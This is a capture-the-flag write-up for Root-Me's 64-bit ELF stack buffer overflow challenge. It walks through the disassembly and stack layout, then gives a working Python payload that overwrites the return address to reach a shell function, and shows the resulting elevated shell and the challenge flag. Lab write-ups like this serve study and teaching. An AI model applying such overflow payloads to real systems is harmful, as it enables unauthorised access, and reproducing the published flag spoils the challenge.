# ELF x64 - Stack buffer overflow - basic
https://www.root-me.org/en/Challenges/App-System/ELF-x64-Stack-buffer-overflow-basic
```
Pwn the binary, read the flag in .passwd.

Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 Yes 
NX 	Non-Executable Stack 	                 Yes 
ASLR 	Address Space Layout Randomization 	 Yes 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2223
SSH access 	ssh -p 2223 app-systeme-ch35@challenge02.root-me.org   
Username	app-systeme-ch35
Password	app-systeme-ch35
```
Let's reverse the assembly abit:
```asm
   0x0000000000400628 <+0>:	push   rbp
   0x0000000000400629 <+1>:	mov    rbp,rsp
   0x000000000040062c <+4>:	sub    rsp,0x120
   0x0000000000400633 <+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x0000000000400639 <+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x0000000000400640 <+24>:	lea    rax,[rbp-0x110]
   0x0000000000400647 <+31>:	mov    rsi,rax
   0x000000000040064a <+34>:	lea    rdi,[rip+0xd0]        # 0x400721
   0x0000000000400651 <+41>:	mov    eax,0x0
   0x0000000000400656 <+46>:	call   0x4004f0 <__isoc99_scanf@plt>
   0x000000000040065b <+51>:	lea    rax,[rbp-0x110]
   0x0000000000400662 <+58>:	mov    rdi,rax
   0x0000000000400665 <+61>:	call   0x4004c0 <strlen@plt>
   0x000000000040066a <+66>:	mov    DWORD PTR [rbp-0x4],eax
   0x000000000040066d <+69>:	lea    rax,[rbp-0x110]
   0x0000000000400674 <+76>:	mov    rsi,rax
   0x0000000000400677 <+79>:	lea    rdi,[rip+0xa6]        # 0x400724
   0x000000000040067e <+86>:	mov    eax,0x0
   0x0000000000400683 <+91>:	call   0x4004d0 <printf@plt>
   0x0000000000400688 <+96>:	mov    eax,0x0
   0x000000000040068d <+101>:	leave  
   0x000000000040068e <+102>:	ret  
```
Before the **scanf** call, there are some allocations in the stack. First, the program will allocate 288 bytes for the function.<br>
Next, it will allocate 272 bytes for the buffer (which according to the source code should only take 256 bytes).<br>
So, basically the stack should look like the following figure, just before calling the **scanf** function:

```
                        +----------------+
                        | return address |
                        +----------------+
                        |   alignment    |
                        +----------------+
                        |                |
                        |  272 bytes of  |
                        |   the buffer   |
                        |                |
                        +----------------+
```

So, basically one should write 280 bytes and then write the wanted return address (in this case, the address to **callMeMaybe**).<br>
Let's verify it:
```sh
app-systeme-ch35@challenge03:~$ python -c "print 'A'*280 + 'DDDD'" | ./ch35 
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```
Well it looks like the return address was changed (according to the segmentation fault).<br>
If we'll change the "DDDD" to the address of the **callMeMaybe** function we should get our shell:
```sh
app-systeme-ch35@challenge03:~$ cat <(python -c 'print "A"*280+"\xe7\x05\x40"+"\x00"*5') - | ./ch35
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
id
uid=1135(app-systeme-ch35) gid=1135(app-systeme-ch35) euid=1235(app-systeme-ch35-cracked) groups=1135(app-systeme-ch35),100(users)
cat .passwd
B4sicBufferOverflowExploitation
```


